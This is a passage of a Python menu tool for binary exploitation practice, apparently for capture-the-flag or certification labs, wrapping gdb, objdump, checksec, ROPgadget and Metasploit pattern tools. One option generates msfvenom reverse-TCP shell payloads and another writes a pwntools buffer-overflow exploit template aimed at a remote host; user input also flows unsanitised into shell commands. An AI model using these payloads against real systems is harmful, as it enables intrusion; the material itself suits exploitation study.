   if selection =='13':
      BAK = IND
      IND = input("[?] Please enter indian value: ")
      if IND != "":
         IND = spacePadding(IND,COL1)
      else:
            IND = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - 
# Details : Menu option selected - Name fileName.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      print(colored("[*] Scanning files in " + localDir + " directory...", colour3))
      command("ls -la " + localDir + " > dir.tmp")
      command("sed -i '1d' ./dir.tmp")
      command("sed -i '1d' ./dir.tmp")
      command("sed -i '1d' ./dir.tmp")
      command("sed -i '/RA.db/d' ./dir.tmp")
      count = lineCount("dir.tmp")
        
      if count < 1:
         print("[-] The directory is empty...")
      else:
         catsFile("dir.tmp")
         BAK = FIL
         FIL = input("[?] Please enter filename: ")
         if FIL != "":
            FIL = spacePadding(FIL,COL0)
            if os.path.exists(localDir + "/" + FIL.rstrip(" ")):
               command("chmod -x " + localDir + "/" + FIL.rstrip(" "))
               MODE = "S"
            else:
               print("[-] I could not find the file name you entered, did you spell it correctly?...")
               FIL = BAK
         else:
            FIL = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - chmod +x fileMame.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='15':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Filename " + localDir + "/" + FIL.rstrip(" ") + " is now NOT executable...", colour3))
         command("chmod -x " + localDir + "/" + FIL.rstrip(" "))
         MODE = "S"
      prompt()                              

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - chmod +x fileMame.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='16':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Filename " + localDir + "/" + FIL.rstrip(" ") + " is now executable...", colour3))
         command("chmod +x " + localDir + "/" + FIL.rstrip(" "))
         MODE = "D"
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Change remote IP address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='17':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("file " + localDir + "/" + FIL.rstrip(" ") + " > file.tmp")
         catsFile("file.tmp")                  
         binary = linecache.getline("file.tmp", 1)
         if "ELF" in binary:
            COM = spacePadding("ELF", COL1)
            print("Linux binary file...")
         if "64-bit" in binary: #ELF 64-bit
            ARC = "64 Bit"
            print(ARC + " architecture...")  
            ARC = spacePadding(ARC, COL1)            
         if "32-bit" in binary:
            ARC = "32 Bit"
            print(ARC + " architecture...")           
            ARC = spacePadding(ARC, COL1)
         if "LSB" in binary:
            IND = "Little"
            print(IND + " indian...")
            IND = spacePadding(IND, COL1)
         if "MSB" in binary:
            IND = "Big"
            print(IND + " indian...")
            IND = spacePadding(IND, COL1)
         if "not stripped" in binary:
            print("Debugging information built in...")
         else:
            print("Debugging information has been removed...")
         if "Intel" in binary:
            print("Consider switching the disassembly style to Intel - 'set disassembly-flavor intel'...")
      prompt()            

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Checksec fileName.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '18':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("checksec " + localDir + "/" + FIL.rstrip(" ") + " 2> checksec.tmp")
         parsFile("checksec.tmp")
         catsFile("checksec.tmp")
         
         print("If RELRO is set to full, then the entire GOT is read-only which removes the ability to perform a 'GOT overwrite' attack...")
         print("If CANARY is found, then the program checks to see if the stack has been smashed...")
         print("If FORTIFY is enabled, then the program checks for buffer overflow...")
         print("If NX is enabled, then the stack is read-only and you will need to use return-oriented programming.")
         print("If PIE is enabled, then the programs memory locations will not stay the same...")
         print("If RWX has segments, then these are writeable and executable at the same time...")
         
         colourx = "green"
         count = lineCount("checksec.tmp") 
         for x in range(0, count):
            binary = linecache.getline("checksec.tmp", x+1)
            if "No RELRO" in binary:
               RE = "RELRO   None      "               
            if "Full RELRO" in binary:
               RE = "RELRO   Full      "               
            if "No canary found" in binary:
               ST = "STACK   No Canary "               
            if "No Fortify" in binary:
               FO = "Fortify Disabled  "               
            if "NX disabled" in binary:
               NX = "NX Disabled       "
            if "NX enabled" in binary:
               NX = "NX      Enabled   "               
            if "No PIE" in binary:
               PI = "No PIE            "               
            if "PIE enabled" in binary:
               PI = "PIE     Enabled   "              
            if "No RWX segments" in binary:
               RW = "No RWX Segments   "
      prompt()
                  
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - ObjDUmp
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '19':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:         
         print(colored("[*] Examining filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("gdb -batch -ex 'file " + localDir + "/" + FIL.rstrip(" ") + "' -ex 'info functions' > functions.tmp")
         parsFile("functions.tmp")
         catsFile("functions.tmp")
         command("sed -i '/0x/!d' functions.tmp")
         funcNum = str(lineCount("functions.tmp"))
         funcNum = spacePadding(funcNum,7)
         with open("functions.tmp", "r") as shares:
            for x in range(0, maxDisp):
               ADDR[x] = shares.readline().rstrip(" ")
               ADDR[x] = spacePadding(ADDR[x], COL2)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Gadgets
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '20':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:      
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("ROPgadget --binary " + localDir + "/" + FIL.rstrip(" ") + " > gadgets.tmp")
         parsFile("gadgets.tmp")
         catsFile("gadgets.tmp")         
         command("sed -i '1d' gadgets.tmp")
         command("sed -i '1d' gadgets.tmp")     
         command("sed -i 's/://g' gadgets.tmp")
         command("sed -i '/Unique gadgets/d' gadgets.tmp")
         gadgNum = str(lineCount("gadgets.tmp") - 3)
         gadgNum = spacePadding(gadgNum,7)
         command("cat gadgets.tmp | tail -n " + str(maxDisp+1) + " > tail.tmp")
         for x in range (0, maxDisp):
            GADD[x] = linecache.getline("tail.tmp", x + 1).rstrip(" ")
            GADD[x] = spacePadding(GADD[x], COL3)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - File headers.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '21':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -f " + localDir + "/" + FIL.rstrip(" ") + " > headers.tmp")
         parsFile("headers.tmp")
         catsFile("headers.tmp")
         
         with open("headers.tmp","r") as read:
            for line in read:
               data = line
               if "i386:x86-64" in data:
                  ARC = spacePadding("64 Bit", COL1)
               if "start address" in data:
                  SRT = spacePadding(data.split(" ")[2], COL1)
               if "elf" in data:
                  COM = spacePadding("ELF", COL1)
      prompt()   
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Object headers.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '22':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -p " + localDir + "/" + FIL.rstrip(" ") + " > objects.tmp")
         catsFile("objects.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Section headers.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '23':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -h " + localDir + "/" + FIL.rstrip(" ") + " > sections.tmp")
         catsFile("sections.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - All Headers.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '24':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -x " + localDir + "/" + FIL.rstrip(" ") + "> all.tmp")
         catsFile("all.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Executable section
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '25':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -d " + localDir + "/" + FIL.rstrip(" ") + " > exec.tmp")
         catsFile("exec.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Debug information.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '26':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -g " + localDir + "/" + FIL.rstrip(" ") + " > debug.tmp")
         catsFile("debug.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Debug + code intermix
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '27':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -D -S " + localDir + "/" + FIL.rstrip(" ") + " > code.tmp")
         catsFile("code.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Symbols
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -t " + localDir + "/" + FIL.rstrip(" ") + " > symbols.tmp")
         catsFile("symbols.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Stabs
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -G " + localDir + "/" + FIL.rstrip(" ") + " > symbols.tmp")
         catsFile("symbols.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Hexform
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '30':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -s " + localDir + "/" + FIL.rstrip(" ") + " > symbols.tmp")
         catsFile("symbols.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - MSF pattern create.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '31':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         length = input("[?] Please input length of pattern: ")
         if length.isdigit():
            print(colored("[*] Creating unique pattern...", colour3))          
            command("msf-pattern_create -l " + length + " > pattern.tmp")
            catsFile("pattern.tmp")
         else:
            print("[-] Invalid value...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Run fileName.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '32':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Running filename " + localDir + "/" + FIL.rstrip(" ") + "...\n", colour3))
         command("./" + localDir + "/" + FIL.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - gdb fileName
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '33':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Editing filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("gdb -q " + localDir + "/" + FIL.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - MSF patter finder
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '34':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Finding buffer offset...", colour3))
         offset = input("[?] Please enter segmentation fault value: ")
         if offset != "":
            command("msf-pattern_offset -l " + length + " -q " + offset + " > offset.tmp")
            catsFile("offset.tmp")
            OFF = linecache.getline("offset.tmp", 1).rstrip("\n").split(" ")[-1]
            OFF = spacePadding(OFF, COL1)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - OFFSET 
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='35':
      BAK = OFF
      OFF = input("[?] Please enter offset value: ")
      if OFF != "":
         OFF = OFF + " Bytes"
         OFF = spacePadding(OFF,COL1)
      else:
            OFF = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Disassemble MAIN.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '36':
      command("echo 'set disassembly-flavor intel' > command.tmp")
      command("echo 'set follow-fork-mode child' >> command.tmp")
      command("echo 'break main' >> command.tmp")
      command("echo 'run' >> command.tmp")
      command("echo 'disassemble' >> command.tmp")
      command("echo 'quit' >> command.tmp")
      command("gdb " + localDir + "/" + FIL.rstrip(" ") +" -x command.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Disassemble main address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '37':
      address = input("[?] Please enter address value: ")
      if address != "":
         command("echo 'set disassembly-flavor intel' > command.tmp")
         command("echo 'set follow-fork-mode child' >> command.tmp")      
         command("echo 'break main' >> command.tmp")
         command("echo 'run' >> command.tmp")
         command("echo 'quit' >> command.tmp")
         command("echo 'disassemble " + address.rstrip(" ") + "' >> command.tmp")
         command("gdb " + localDir + "/" + FIL.rstrip(" ") +" -x command.tmp")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Disassemble a function.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      function = input("[?] Please enter function name: ")
      command("echo 'set disassembly-flavor intel' > command.tmp")
      command("echo 'set follow-fork-mode child' >> command.tmp")      
      command("echo 'break main' >> command.tmp")
      command("echo 'run' >> command.tmp")
      command("echo 'disassemble /m " + function.rstrip(" ") + "' >> command.tmp")
      command("echo 'quit' >> command.tmp")
      command("gdb " + localDir + "/" + FIL.rstrip(" ") +" -x command.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Hex Editor.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '41':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Editing filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("ghex " + localDir + "/" + FIL.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Start ghidra.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '42':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Ghidra has been initiated...", colour3))          
         command("/opt/ghidra_9.2.2_PUBLIC/ghidraRun ./analyzeHeadless ./" + localDir + " -import " + localDir + "/" + FIL.rstrip(" ") + " > boot.tmp 2>&1")
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Start Immunity Debugger.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '43':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Immunity debugger has been initiated...", colour3))          
         command("env WINEPREFIX='/root/.wine' wine C:/\windows/\command/\start.exe /Unix /root/.wine/dosdevices/c:/users/Public/Desktop/Immunity\ Debugger.lnk > boot.tmp 2>&1")
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Start nasm_shell.rb.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '44':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Nasm shell initiated...", colour3))          
         command("/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb")
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Generate shell code.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '45':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         localHost = input("[?] Please enter localhost value: ")
         localPort = input("[?] Please enter localport value: ")
         if COM[:3] == "ELF":
            command("msfvenom -p linux/x" + ARC[:2] + "/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x" + ARC[:2] + " > payload.tmp")
         else:
            command("msfvenom -p windows/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x" + ARC[:2] + " > payload.tmp")
         catsFile("payload.tmp")
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Generate exploit code.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '46':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         command("echo '#!/usr/bin/python' > " + localDir + "/exploit.py")
         command("echo '# coding:UTF-8' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo '# -------------------------------------------------------------------------------------'  >> " + localDir + "/exploit.py")
         command("echo '#                 PYTHON UTILITY SCRIPT FILE FOR BINARY EXPLOITATION' >> " + localDir + "/exploit.py")
         command("echo '#               BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)' >> " + localDir + "/exploit.py")
         command("echo '# -------------------------------------------------------------------------------------' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 'from pwn import *' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 'context.log_level = \"debug\"' >> " + localDir + "/exploit.py")
         if COM[:3] == "ELF":
            command("echo 'context(os=\"linux\")' >> " + localDir + "/exploit.py")
         else:
            command("echo 'context(os=\"windows\")' >> " + localDir + "/exploit.py")
         if ARC[:2] == "64":
            command("echo 'context(arch=\"amd64\")' >> " + localDir + "/exploit.py")
         else:
            command("echo 'context(arch=\"amd32\")' >> " + localDir + "/exploit.py")                     
         if IND[:3] == "Big":
            command("echo 'context.endian = \"big\"' >> " + localDir + "/exploit.py")
         else:
            command("echo 'context.endian = \"little\"' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 'try:' >> " + localDir + "/exploit.py")
         command("echo '   s = remote(\"10.10.10.10\", 1010)' >> " + localDir + "/exploit.py")
         command("echo 'except:' >> " + localDir + "/exploit.py")
         command("echo '   s = process(\"./" + FIL.rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 'buffers   = \"a\" * " + OFF.rstrip(" ") + "' >> " + localDir + "/exploit.py")
         command("echo 'integer   = \"a\" * 4' >> " + localDir + "/exploit.py")
         if ARC[:2] == "64":
            command("echo 'pointer   = \"a\" * 8' >> "+ localDir + "/exploit.py")
         else:
            command("echo 'pointer   = \"a\" * 4' >> "+ localDir + "/exploit.py")         
         command("echo 'padding   = \"a\" * 4' >> "+ localDir + "/exploit.py")  
         command("echo 'overwrite = p64(" + SRT.rstrip(" ") + ")' >> "+ localDir + "/exploit.py")  
         command("echo 'term      = \"\ n\" #amend' >> "+ localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 'payload = flat(buffers,integer,pointer,padding,overwrite,term)' >> "+ localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py")
         command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
         command("echo 's.interactive()' >> " + localDir + "/exploit.py")
         command("echo 's.close()' >> " + localDir + "/exploit.py")
         prompt()         
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - RESET
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '59':       
      print(colored("[*] Re-Setting Program...", colour3)) 
      
      RAX = spacePadding("0x0000000000000000", COL1)
      COM = spacePadding("EMPTY", COL1)
      RBX = spacePadding("0x0000000000000000", COL1)
      RCX = spacePadding("0x0000000000000000", COL1)
      RDX = spacePadding("0x0000000000000000", COL1)
      RSI = spacePadding("0x0000000000000000", COL1)
      RDI = spacePadding("0x0000000000000000", COL1)
      RSP = spacePadding("0x0000000000000000", COL1)
      RBP = spacePadding("0x0000000000000000", COL1)
      OFF = spacePadding("0", COL1)
      IND = spacePadding("EMPTY", COL1)
      ARC = spacePadding("EMPTY", COL1)
      FIL = spacePadding("UNKNOWN", COL0)
      SRT = spacePadding("0x0000000000000000", COL1)
      INS = spacePadding("0x0000000000000000", COL1)
      saveParams()
      ADDR = [" "*COL2]*maxDisp
      GADD = [" "*COL3]*maxDisp
      RE = spacePadding("RELRO   Unknown", COL1)
      ST = spacePadding("STACK   Unknown", COL1)
      FO = spacePadding("FORTIFY Unknown", COL1)
      NX = spacePadding("NX      Unknown", COL1)
      PI = spacePadding("PIE     Unknown", COL1)
      RW = spacePadding("RWX     Unknown", COL1)
      colourx = "yellow"
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Save running config to config.txt and exit program
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '60':        
      saveParams()
      command("rm *.tmp")      
      connection.close()
      print(colored("[*] Program sucessfully terminated...", colour3))
      exit(1)  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Secret option
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '100':
      dispBanner("ROGUE AGENT",1)
      print(colored("C O P Y R I G H T  2 0 2 1  -  T E R E N C E  B R O A D B E N T",colour7,attrs=['bold']))
      print("\n------------------------------------------------------------------------------")
      count = lineCount(localDir + "/usernames.txt")
      print("User Names :" + str(count))
      count = lineCount(localDir + "/passwords.txt")
      print("Pass Words :" + str(count))
      count = lineCount(localDir + "/hashes.txt")
      print("Hash Values:" + str(count))      
      prompt()      
# Eof...
